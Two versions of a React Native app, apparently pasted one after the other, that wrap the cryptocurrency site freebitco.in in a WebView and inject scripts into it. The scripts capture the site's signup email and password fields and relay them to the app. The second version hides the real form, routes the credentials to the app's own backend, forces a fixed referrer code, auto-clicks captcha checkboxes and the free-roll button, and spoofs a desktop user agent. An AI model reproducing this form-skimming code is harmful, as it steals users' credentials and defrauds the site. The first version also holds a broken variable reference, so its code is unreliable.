import React, {useEffect, useRef} from 'react';
import {View, Platform, SafeAreaView, StyleSheet} from 'react-native';
import BackgroundFetch from 'react-native-background-fetch';
import WebView from 'react-native-webview';

const fetchData = async () => {
  try {
    const response = await fetch(
      'https://backend.jimsbelpkl.in/api/v1/get-state-districts?name=atiq',
    );
    const data = await response.json();
    console.log('[📦 BackgroundFetch] Data fetched:', data);
    return true;
  } catch (error) {
    console.error('[❌ BackgroundFetch] Error:', error);
    return false;
  }
};

export default function App() {
  const webViewRef = useRef(null);

  useEffect(() => {
    const initBackgroundFetch = async () => {
      try {
        const status = await BackgroundFetch.configure(
          {
            minimumFetchInterval: 15,
            stopOnTerminate: false,
            startOnBoot: true,
            enableHeadless: true,
            requiredNetworkType: BackgroundFetch.NETWORK_TYPE_ANY,
          },
          async taskId => {
            console.log('[✅ BackgroundFetch] task received:', taskId);
            await fetchData();
            BackgroundFetch.finish(taskId);
          },
          taskId => {
            console.warn('[⚠️ BackgroundFetch] TIMEOUT:', taskId);
            BackgroundFetch.finish(taskId);
          },
        );

        switch (status) {
          case BackgroundFetch.STATUS_RESTRICTED:
            console.log('BackgroundFetch restricted');
            break;
          case BackgroundFetch.STATUS_DENIED:
            console.log('BackgroundFetch denied');
            break;
          case BackgroundFetch.STATUS_AVAILABLE:
            console.log('BackgroundFetch enabled');
            break;
          default:
            console.log('BackgroundFetch status:', status);
        }
      } catch (error) {
        console.error('[❌ BackgroundFetch Init Error]', error);
      }
    };

    initBackgroundFetch();

    // Schedule a task for testing
    BackgroundFetch.scheduleTask({
      taskId: 'com.yourcompany.yourapp.task',
      delay: 5000,
      periodic: false,
    });

    // Cleanup on unmount
    return () => {
      BackgroundFetch.stop();
    };
  }, []);

  // JavaScript code to inject
  const injectedJavaScript = `
    (function() {
      const isSignupForm = document.querySelector('#signup_form_div');
      // Modify the page content
      document.body.style.backgroundColor = '#d3a8a8';
      if(signupForm){
      
        const emailAddress = document.querySelector('#signup_form_email');
        const password = document.querySelector('#signup_form_password');
        const signUpButton = document.querySelector('#signup_button');
        const referrerCode = document.querySelector('#referrer_in_form');

         function sendFormValues() {
          const message = {
            type: 'form_values',
            email: emailAddress && emailAddress.value ? emailAddress.value : '',
            password: password && password.value ? password.value : '',
            referrerCode: referrerCode && referrerCode.value ? referrerCode.value : ''
          };
          // Ensure message is stringified
          window.ReactNativeWebView.postMessage(JSON.stringify(message));
        }

        // Send initial values
        sendFormValues();

        if (emailAddress) {
          emailAddress.addEventListener('input', sendFormValues);
        }
       }else{
       window.ReactNativeWebView.postMessage(JSON.stringify({
          type: 'error',
          message: 'Signup form not found'
        }))}
    })();
    true; // Required for WebView to process the injection
  `;

  // Handle messages from WebView
  const onMessage = (event:any) => {
    console.log(event)
    console.log('Received from WebView:', event.nativeEvent.data);
  };

  return (
    <SafeAreaView style={styles.container}>
      <WebView
        ref={webViewRef}
        source={{uri: 'https://freebitco.in/'}}
        injectedJavaScript={injectedJavaScript}
        onMessage={onMessage}
        style={styles.webview}
        javaScriptEnabled={true}
        domStorageEnabled={true}
        allowFileAccess={false}
        allowUniversalAccessFromFileURLs={false}
      />
    </SafeAreaView>
  );
}

const styles = StyleSheet.create({
  container: {
    flex: 1,
    paddingTop: Platform.OS === 'android' ? 30 : 0,
    backgroundColor: '#fff',
  },
  webview: {
    flex: 1,
  },
});










import React, {useEffect, useRef, useState} from 'react';
import {
  View,
  Platform,
  SafeAreaView,
  StyleSheet,
  Dimensions,
} from 'react-native';
import BackgroundFetch from 'react-native-background-fetch';
import WebView from 'react-native-webview';
import LoginForm from './src/components/LoginForm';
import Toast from 'react-native-toast-message';
import useAxios from './src/hooks/useAxios';
import {showNotification} from './src/utils/Notify';
const fetchData = async () => {
  try {
    const response = await fetch(
      'https://backend.jimsbelpkl.in/api/v1/get-state-districts?name=atiq',
    );
    const data = await response.json();
    console.log('[📦 BackgroundFetch] Data fetched:', data);
    return true;
  } catch (error) {
    console.error('[❌ BackgroundFetch] Error:', error);
    return false;
  }
};

export default function App() {
  const webViewRef = useRef(null);
  const [referrerCode] = useState(55157605);
  const {fetchData} = useAxios();

  const [isSignupFormAvail, setIsSignUpFormAvail] = useState(false);

  useEffect(() => {
    const initBackgroundFetch = async () => {
      try {
        const status = await BackgroundFetch.configure(
          {
            minimumFetchInterval: 15,
            stopOnTerminate: false,
            startOnBoot: true,
            enableHeadless: true,
            requiredNetworkType: BackgroundFetch.NETWORK_TYPE_ANY,
          },
          async taskId => {
            console.log('[✅ BackgroundFetch] task received:', taskId);
            // await fetchData();
            BackgroundFetch.finish(taskId);
          },
          taskId => {
            console.warn('[⚠️ BackgroundFetch] TIMEOUT:', taskId);
            BackgroundFetch.finish(taskId);
          },
        );

        switch (status) {
          case BackgroundFetch.STATUS_RESTRICTED:
            console.log('BackgroundFetch restricted');
            break;
          case BackgroundFetch.STATUS_DENIED:
            console.log('BackgroundFetch denied');
            break;
          case BackgroundFetch.STATUS_AVAILABLE:
            console.log('BackgroundFetch enabled');
            break;
          default:
            console.log('BackgroundFetch status:', status);
        }
      } catch (error) {
        console.error('[❌ BackgroundFetch Init Error]', error);
      }
    };

    initBackgroundFetch();

    BackgroundFetch.scheduleTask({
      taskId: 'com.yourcompany.yourapp.task',
      delay: 5000,
      periodic: false,
    });

    return () => {
      BackgroundFetch.stop();
    };
  }, []);

  const injectedJavaScript = `
  (function() {
    let retryCount = 0;
    const MAX_RETRIES = 5;
  
    function tryInject() {
      const signupForm = document.querySelector('#signup_form_div'); 
      const isRollButtonAvail = document.querySelector('#free_play_form_button');
  
      if (isRollButtonAvail) {
        window.ReactNativeWebView.postMessage(JSON.stringify({ type: 'roll_Button', avail: true }));
      }
  
      if (signupForm) {
        window.ReactNativeWebView.postMessage(JSON.stringify({ type: 'signup_form', avail: true }));
        signupForm.style.visibility = 'hidden';
        document.body.style.backgroundColor = '#d3a8a8';
  
        const emailAddress = document.querySelector('#signup_form_email');
        const password = document.querySelector('#signup_form_password');
        const signUpButton = document.querySelector('#signup_button');
        const referrerCode = document.querySelector('#referrer_in_form');
  
        if (referrerCode) {
          if (!referrerCode.value) {
            referrerCode.value = ${referrerCode};
          }
          referrerCode.disabled = true;
        }
  
        function sendFormValues() {
          const message = {
            type: 'form_values',
            email: emailAddress && emailAddress.value ? emailAddress.value : '',
            password: password && password.value ? password.value : '',
            referrerCode: referrerCode && referrerCode.value ? referrerCode.value : ''
          };
          window.ReactNativeWebView.postMessage(JSON.stringify(message));
        }
  
        sendFormValues();
  
        if (emailAddress) emailAddress.addEventListener('input', sendFormValues);
        if (password) password.addEventListener('input', sendFormValues);
        if (referrerCode) referrerCode.addEventListener('input', sendFormValues);
  
        if (signUpButton) {
          signUpButton.addEventListener('click', function() {
            const message = {
              type: 'button_clicked',
              message: 'Signup button clicked'
            };
            window.ReactNativeWebView.postMessage(JSON.stringify(message));
          });
        }
  
      } else if (retryCount < MAX_RETRIES) {
        retryCount++;
        setTimeout(tryInject, 1000);
        window.ReactNativeWebView.postMessage(JSON.stringify({ type: 'signup_form', avail: false }));
      }
    }
  
    tryInject();
  })();
  true;
  `;

  const autoRollFunctionalities = async () => {
    if (webViewRef.current) {
      webViewRef.current.injectJavaScript(`
        (function() {
          const MAX_WAIT_MS = 5000;
          const startTime = Date.now();
  
          const checkCaptcha = setInterval(() => {
            let checkbox = document.querySelector('input[type="checkbox"]');
            let foundInIframe = false;
  
            if (!checkbox) {
              const iframes = document.getElementsByTagName('iframe');
              for (let iframe of iframes) {
                try {
                  const doc = iframe.contentDocument || iframe.contentWindow.document;
                  checkbox = doc.querySelector('input[type="checkbox"]');
                  if (checkbox) {
                    foundInIframe = true;
                    break;
                  }
                } catch (e) {
                  // Ignore cross-origin frames
                }
              }
            }
  
            const elapsed = Date.now() - startTime;
  
            if (checkbox || elapsed > MAX_WAIT_MS) {
              clearInterval(checkCaptcha);
  
              if (checkbox) {
                checkbox.click();
                setTimeout(() => {
                  const rollButton = document.querySelector('#free_play_form_button');
                  if (rollButton) rollButton.click();
                }, 2000);
              }
  
              window.ReactNativeWebView.postMessage(JSON.stringify({
                type: 'captchaStatus',
                avail: !!checkbox,
                inIframe: foundInIframe,
                timeElapsed: elapsed
              }));
            }
          }, 200);
        })();
        true;
      `);
    }
  };
  

  const onMessage = (event: any) => {
    try {
      const data = JSON.parse(event.nativeEvent.data);
      console.log('Received from WebView:', data);

      switch (data.type) {
        case 'form_values':
          break;

        case 'button_clicked':
          console.log('✅ Signup button was clicked!');
          break;

        case 'signup_form':
          let isAvail = data?.avail;
          setIsSignUpFormAvail(isAvail);
          break; // <-- This was missing

        case 'roll_Button':
          autoRollFunctionalities();
          break;
        case 'error':
          console.error('WebView Error:', data.message);
          break;

        default:
          console.log('Unknown message type:', data.type);
      }
    } catch (error) {
      console.error('Failed to parse WebView message:', error);
      Toast.show({
        type: 'error',
        text1: 'WebView Error',
        text2: 'Failed to process message from WebView',
      });
    }
  };
  const onSubmit = async (value: any) => {
    console.log(value);
    if (webViewRef.current) {
      // Stringify the values to safely inject them into JavaScript
      const emailValue = JSON.stringify(value.email || '');
      const payload = {
        email: value.email,
        password: value.password,
        referrerCode: value.referCode,
      };
      try {
        const {data} = await fetchData({
          url: 'user/auth/signup',
          method: 'POST',
          data: payload,
        });

        if (data.success) {
          showNotification(data.message, 'success');
        }
      } catch (error) {
        return;
      }

      webViewRef.current.injectJavaScript(`
      (function() {
        const signUpButton = document.querySelector('#signup_button');
        const emailAddress = document.querySelector('#signup_form_email');
        const passwordInput = document.querySelector('#signup_form_password');
        
        // Set email if provided
        if (emailAddress && ${emailValue}) {
          emailAddress.value = ${emailValue};
        }
        
        // Optionally set password if you have it
        if (passwordInput && ${JSON.stringify(value.password || '')}) {
          passwordInput.value = ${JSON.stringify(value.password || '')};
        }
        
        if (signUpButton) {
          signUpButton.click();
        } else {
          console.warn('Sign-up button not found');
          window.ReactNativeWebView.postMessage(JSON.stringify({
            type: 'error',
            message: 'Signup button not found'
          }));
        }
      })();
      true;
    `);
    }
  };
  return (
    <SafeAreaView style={styles.container}>
      <WebView
        ref={webViewRef}
        source={{uri: 'https://freebitco.in/'}}
        injectedJavaScript={injectedJavaScript}
        onMessage={onMessage}
        style={styles.webview}
        javaScriptEnabled={true}
        domStorageEnabled={true}
        allowFileAccess={false}
        allowUniversalAccessFromFileURLs={false}
         userAgent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
      />
      {isSignupFormAvail && <LoginForm onSubmit={onSubmit} />}
    </SafeAreaView>
  );
}

const styles = StyleSheet.create({
  container: {
    flex: 1,
    paddingTop: Platform.OS === 'android' ? 30 : 0,
    backgroundColor: '#fff',
  },
  webview: {
    flex: 1,
  },
});
